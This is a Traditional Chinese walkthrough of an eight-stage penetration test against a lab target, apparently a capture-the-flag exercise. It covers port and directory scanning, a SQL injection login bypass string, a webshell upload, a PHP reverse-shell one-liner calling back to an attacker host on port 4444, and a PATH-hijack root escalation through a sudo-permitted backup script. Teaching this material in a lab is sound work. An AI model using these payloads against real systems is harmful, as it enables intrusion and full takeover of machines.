📊 8大階段詳解

每個階段的目標、工具和手法

1️⃣ 網路偵察

目標：
識別靶機上的開放埠和運行的服務
工具：
Nmap - 網路埠掃描工具
命令：
nmap -sV -p- 172.30.0.4
成功標誌：
發現 HTTP、SSH、FTP 等服務

2️⃣ Web 應用掃描

目標：
發現隱藏的目錄、檔案和頁面
工具：
Dirb - 目錄掃描工具
dirb http://172.30.0.4 /usr/share/dirb/wordlists/common.txt
成功標誌：
找到 /index.php、/upload.php、/dashboard.php

3️⃣ 漏洞分析

目標：
分析應用程式的登入機制，測試 SQL Injection
手法：
測試登入表單是否有 SQL Injection 漏洞
成功標誌：
發現登入頁面接受 SQL Injection

4️⃣ 登入繞過

目標：
利用 SQL Injection 繞過身份驗證
手法：
在登入表單輸入特殊的 SQL 語句
username: admin' or '1'='1 password: anything
成功標誌：
成功登入，獲得 Session Cookie

5️⃣ 檔案上傳

目標：
上傳 WebShell 到伺服器
挑戰：
繞過檔案驗證（副檔名、MIME Type等）
成功標誌：
上傳 PHP 檔案並在 /uploads 目錄找到

6️⃣ 反向連接

目標：
建立從靶機回連攻擊機的交互式 Shell
優勢：
比 WebShell 更靈活，可執行複雜命令
php -r '$sock=fsockopen("172.30.0.5",4444);exec("bash <&3 >&3 2>&3");'
成功標誌：
獲得 www-data 使用者的交互式 Shell

7️⃣ 提權掃描

目標：
自動掃描系統中的提權漏洞
工具：
LinPEAS - Linux 提權掃描工具
成功標誌：
發現 sudo /usr/local/bin/runbackup 可執行

8️⃣ 權限提升

⚠️ 最關鍵的階段！
從 www-data 提升到 root，需要利用系統漏洞或錯誤配置。
方法一：
直接提權 - 執行 /bin/bash 直接獲得 root shell
echo '/bin/bash' > /tmp/tar chmod +x /tmp/tar export PATH=/tmp:$PATH sudo /usr/local/bin/runbackup
方法二：
SUID 提權 - 設置 bash 的 SUID 位
方法三：
反向提權 - 讓 root 執行反向 Shell
成功標誌：
獲得 root shell，取得 Flag 文件

💡 各階段提示

  • 第1-2階段： 被動掃描，不會對目標造成損害
  • 第3-4階段： 開始與目標系統互動，需小心謹慎
  • 第5-6階段： 獲取了初級訪問權限，但還不是管理員
  • 第7-8階段： 最具挑戰性，需要深入系統知識
